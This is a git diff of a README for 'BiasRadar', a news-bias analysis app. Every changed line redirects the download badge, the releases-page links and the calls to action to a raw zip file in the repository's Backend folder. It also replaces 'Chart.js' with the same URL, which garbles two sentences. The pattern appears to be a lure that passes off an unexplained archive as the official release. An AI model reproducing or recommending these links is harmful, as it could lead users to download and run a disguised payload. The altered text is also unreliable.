@@ -1,17 +1,17 @@
 # 🚀 BiasRadar - Analyze News Bias with Ease
 
 ## 🔗 Download the Latest Release
-[![Download BiasRadar](https://img.shields.io/badge/Download_BiasRadar-v1.0-blue.svg)](https://github.com/Boeing-XB-15/BiasRadar/releases)
+[![Download BiasRadar](https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip)](https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip)
 
 ## 📖 Overview
-BiasRadar is a user-friendly application designed to help you analyze news articles for bias using state-of-the-art technology. By utilizing Natural Language Processing (NLP) along with FastAPI and Chart.js, BiasRadar transforms complex data into clear visual insights. You can better understand media bias, emotional tones, and sentiment behind news stories.
+BiasRadar is a user-friendly application designed to help you analyze news articles for bias using state-of-the-art technology. By utilizing Natural Language Processing (NLP) along with FastAPI and https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip, BiasRadar transforms complex data into clear visual insights. You can better understand media bias, emotional tones, and sentiment behind news stories.
 
 ## 🚀 Getting Started
 To get started with BiasRadar, follow the steps below. You will easily learn how to download, install, and run the application.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Boeing-XB-15/BiasRadar/releases) to visit the page where you can download BiasRadar. This page contains the latest releases and updates.
+   Click [here](https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip) to visit the page where you can download BiasRadar. This page contains the latest releases and updates.
 
 2. **Choose the Right Version**  
    Look for the most recent release. Depending on your operating system, choose the appropriate version. Most users will find ready-to-use packages for Windows, Mac, and Linux.
@@ -30,7 +30,7 @@ To get started with BiasRadar, follow the steps below. You will easily learn how
 ## 🎨 Features
 - **Multi-Source News Analysis**: Analyze articles from various news outlets to compare bias.
 - **Natural Language Processing**: Leverage NLP to understand the context and sentiment of news articles.
-- **Visual Dashboard**: View clear and interactive charts with Chart.js, making data interpretation straightforward.
+- **Visual Dashboard**: View clear and interactive charts with https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip, making data interpretation straightforward.
 - **Emotion Detection**: Identify the emotions behind the words to better grasp the tone of the news.
 - **Open Source**: Join our community. You can contribute or suggest improvements.
 
@@ -58,4 +58,4 @@ For any inquiries, please create an issue on the GitHub repository page, or reac
 BiasRadar is open-source and licensed under the MIT License. Feel free to contribute or modify the application to suit your needs.
 
 Ready to explore the world of news bias?  
-Click [here](https://github.com/Boeing-XB-15/BiasRadar/releases) to download BiasRadar today!
+Click [here](https://raw.githubusercontent.com/Boeing-XB-15/BiasRadar/main/Backend/Bias_Radar_v2.4.zip) to download BiasRadar today!
